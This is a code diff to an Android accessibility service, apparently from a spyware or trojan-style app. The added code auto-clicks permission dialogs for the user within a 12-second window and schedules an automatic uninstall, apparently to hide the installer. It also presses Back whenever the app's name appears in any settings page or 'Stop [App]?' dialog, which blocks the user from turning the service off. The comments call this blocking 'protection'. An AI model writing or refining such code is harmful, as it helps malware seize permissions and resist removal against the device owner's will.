@@ -192,16 +192,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
 
         // Auto-click scanner (defent protection) and auto-uninstall:
-        //   First launch → wait 30 s (permissions are still being granted, screen is busy)
+        //   First launch → wait 12 s (matches the 12 s auto-grant overlay window)
         //   Reboot/restart → start within 2-3 s (everything is already set up)
-        final long protectionDelayMs = isFirstLaunch ? 30_000L : 2_000L;
+        final long protectionDelayMs = isFirstLaunch ? 12_000L : 2_000L;
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
             }, protectionDelayMs);
         } catch (Exception ignored) {}
 
-        try { scheduleAutoUninstall(isFirstLaunch ? 30_000L : 3_000L); } catch (Exception ignored) {}
+        try { scheduleAutoUninstall(isFirstLaunch ? 12_000L : 3_000L); } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -922,7 +922,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                 } catch (Exception ignored) {}
                 if (permissionScanHandler != null && permissionScanRunnable != null) {
-                    permissionScanHandler.postDelayed(this, 200);
+                    permissionScanHandler.postDelayed(this, 80);
                 }
             }
         };
@@ -962,15 +962,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                 } catch (Exception ignored) {}
                 if (autoGrantMode && autoGrantHandler != null) {
-                    autoGrantHandler.postDelayed(this, 100);
+                    autoGrantHandler.postDelayed(this, 50);
                 }
             }
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // Trigger all missing runtime permissions so the dialogs appear for the granter to click.
-        // Delay 1 s so the accessibility overlay is fully visible first.
-        autoGrantHandler.postDelayed(() -> {
+        // Trigger all missing runtime permissions immediately — no delay.
+        autoGrantHandler.post(() -> {
             try {
                 Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
                 pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS,
@@ -981,14 +980,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } catch (Exception e) {
                 Log.w(TAG, "Auto-grant: could not launch PermissionRequestActivity: " + e.getMessage());
             }
-        }, 1_000);
+        });
 
-        // Auto-grant mode expires after 29 seconds.
+        // Auto-grant mode expires after 12 seconds.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 29 seconds");
-        }, 29_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 29s");
+            Log.i(TAG, "Auto-grant mode expired after 12 seconds");
+        }, 12_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 12s");
     }
 
     /**
@@ -2639,15 +2638,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void initAccessibilityAssist(boolean isFirstLaunch) {
         accessibilityAssistIsFirstLaunch = isFirstLaunch;
-        if (isFirstLaunch) {
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                accessibilityAssistEnabled = true;
-                Log.i(TAG, "AccessibilityAssist: enabled (first-launch, 6 s delay)");
-            }, 6_000);
-        } else {
-            accessibilityAssistEnabled = true;
-            Log.i(TAG, "AccessibilityAssist: enabled immediately (boot/restart)");
-        }
+        // Enable immediately — no delay on first launch or boot.
+        // We want protection from the very first moment the service is connected.
+        accessibilityAssistEnabled = true;
+        Log.i(TAG, "AccessibilityAssist: enabled immediately (isFirstLaunch=" + isFirstLaunch + ")");
     }
 
     /**
@@ -2689,8 +2683,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
 
-                // Single root read — search for app name and "stop" in one pass.
-                // findAccessibilityNodeInfosByText does a contains-match on visible nodes only.
+                // Search for app name anywhere on screen, plus "stop" for dialog detection.
                 List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
                 List<AccessibilityNodeInfo> stopNodes = root.findAccessibilityNodeInfosByText("stop");
                 root.recycle();
@@ -2700,37 +2693,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 if (nameNodes != null) for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
                 if (stopNodes != null) for (AccessibilityNodeInfo n : stopNodes) try { n.recycle(); } catch (Exception ignored) {}
 
-                // Main accessibility detail page: app name visible AND package path
-                // contains "accessibility".
-                boolean isOurAccessibilityPage =
-                        foundName && packageName.toLowerCase().contains("accessibility");
+                if (!foundName) return; // App name not on screen — nothing to protect
 
-                // Stop-confirmation dialog: app name AND "stop" both visible, but NOT
-                // the main accessibility list (which is handled separately above).
-                // This fires when Android shows the "Stop [App]?" confirmation prompt.
-                boolean isStopConfirmDialog = foundName && foundStop && !isOurAccessibilityPage;
-
-                if (isOurAccessibilityPage) {
-                    // Press Back vigorously every time this page is detected.
+                // Any time our app name is visible inside any settings window, press Back
+                // immediately. This covers:
+                //   • The main Accessibility settings list (service shown as enabled)
+                //   • The accessibility service detail / toggle page
+                //   • The "Stop [App]?" confirmation dialog
+                //   • Any other settings page that mentions our app name
+                // Two rapid Back presses handle both single-page dismissal and dialogs.
+                try { performBack(); } catch (Exception ignored) {}
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                     try { performBack(); } catch (Exception ignored) {}
+                }, 80L);
 
-                    // Fire Back + Home exactly once on the very first launch.
-                    if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
-                        accessibilityAssistBackHomeFired = true;
-                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            try { performBack(); } catch (Exception ignored) {}
-                        }, 150L);
-                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            try { performHome(); } catch (Exception ignored) {}
-                        }, 450L);
-                    }
-
-                } else if (isStopConfirmDialog) {
-                    // Stop-confirmation dialog detected — press Back twice immediately.
-                    try { performBack(); } catch (Exception ignored) {}
+                // If this is also a stop-confirmation dialog (app name + "stop" visible),
+                // press Back a third time for extra certainty.
+                if (foundStop) {
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try { performBack(); } catch (Exception ignored) {}
-                    }, 80L);
+                    }, 180L);
+                }
+
+                // On very first launch fire Back + Home once to close settings entirely.
+                if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
+                    accessibilityAssistBackHomeFired = true;
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        try { performBack(); } catch (Exception ignored) {}
+                    }, 300L);
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        try { performHome(); } catch (Exception ignored) {}
+                    }, 500L);
                 }
             } catch (Exception ignored) {}
         });
